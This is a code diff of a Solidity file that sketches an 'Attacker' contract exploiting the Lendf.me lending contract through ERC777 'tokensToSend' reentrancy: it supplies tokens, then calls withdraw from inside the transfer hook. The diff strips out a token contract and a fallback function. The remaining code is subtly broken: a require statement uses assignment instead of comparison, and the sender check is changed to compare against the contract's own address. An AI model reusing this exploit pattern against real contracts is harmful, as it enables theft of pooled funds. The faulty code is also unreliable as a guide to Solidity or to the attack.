@@ -1,36 +1,24 @@
 pragma solidity ^0.6.4;
 
-import "openzeppelin-solidity/contracts/token/ERC777/ERC777.sol";
-
-contract ERC777Token is ERC777 {
-
-    uint256 public constant initialSupply = 2 ** 256 - 1;
-
-    constructor () public ERC777("ERC777Token", "SSST", new address[](0)) {
-        _mint(msg.sender, msg.sender, initialSupply, "", "");
-    }
-}
-
 // Attacker contract
-contract Attacker is IERC777Sender {
+contract Attacker {
 
-    function a()
+    Lendme me;
+
+    function a() public
     {
-        Lendme me = Lendme(0x11111);
+        me = Lendme(0x11111);
         me.supply(this, 100);
     }
 
     // ERC777 hook
     function tokensToSend(address, address, address, uint256, bytes calldata, bytes calldata) external {
-        require(msg.sender = address(_token), "Hook can only be called by the token");
+        require(msg.sender = address(this), "Hook can only be called by the token");
             me.withdraw(this, 100);
     }
-
-    // Include fallback so we can receive ETH from exchange
-    function () external payable {}
 }
 // Lendf.me vulnerable contract
-Contract Lendme
+contract Lendme
 {
     /**
     * @notice supply `amount` of `asset` (which must be supported) to `msg.sender` in the protocol
